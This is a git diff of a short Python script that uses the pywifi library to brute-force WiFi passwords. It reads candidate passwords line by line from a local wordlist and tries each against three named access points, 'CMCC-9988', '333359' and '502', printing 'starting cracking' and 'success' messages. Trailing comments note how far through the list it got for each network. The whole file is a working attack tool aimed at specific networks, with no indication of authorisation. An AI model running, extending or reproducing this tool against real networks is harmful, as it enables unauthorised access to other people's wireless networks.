@@ -1,16 +1,17 @@
 # @Author  : 汪凌峰（Eric Wang）
 # @Date    : 2022/8/1
 import time
-
 import pywifi
 from pywifi import const
 
+# 抓取网卡接口
+wifi = pywifi.PyWiFi()
+# 获取第一个无线网卡
+ifaces = wifi.interfaces()[0]
+
+
 # 测试连接，返回链接结果
-def wifiConnect(pwd):
-    # 抓取网卡接口
-    wifi = pywifi.PyWiFi()
-    # 获取第一个无线网卡
-    ifaces = wifi.interfaces()[0]
+def wifiConnect(pwd, ssid):
     # 断开所有连接
     ifaces.disconnect()
     time.sleep(1)
@@ -19,7 +20,7 @@ def wifiConnect(pwd):
         # 创建WiFi连接文件
         profile = pywifi.Profile()
         # 要连接WiFi的名称
-        profile.ssid = "H3C_9B3196"
+        profile.ssid = ssid
         # 网卡的开放状态
         profile.auth = const.AUTH_ALG_OPEN
         # wifi加密算法,一般wifi加密算法为wps
@@ -46,29 +47,41 @@ def wifiConnect(pwd):
 
 
 def readPassword():
+    ssids = ['CMCC-9988', '333359', '502']
     print("开始破解:")
     # 密码本路径
     path = "D:\Desktop\Python\wifi8.txt"
     # 打开文件
     with open(path, "r") as file:
+        i = 0
         while True:
             try:
                 # 一行一行读取
                 pwd = file.readline().replace('\n', '')
+                i += 1
                 if len(pwd) >= 8:
-                    bool = wifiConnect(pwd)
-                    if bool:
-                        print("成了: ", pwd)
-                        print("哦了,Wifi已连接！！！")
-                        break
+                    if i < -1:
+                        print(i)
+                        continue
                     else:
-                        # 跳出当前循环，进行下一次循环
-                        print("这个密码不对: ", pwd)
+                        for s in ssids:
+                            print('ssid:', s)
+                            bool = wifiConnect(pwd, s)
+                            if bool:
+                                print("成了: ", pwd)
+                                print("哦了,Wifi已连接！！！")
+                                break
+                            else:
+                                # 跳出当前循环，进行下一次循环
+                                print(i, "这个密码不对: ", pwd)
             except:
                 continue
 
 
 readPassword()
+# "CMCC-9988" 8484
+# 333359 120
+# 502 128
 
 # with open('D:\Desktop\Python\wifi.txt', 'r') as file:
 #     pwds = file.read().split('\n')
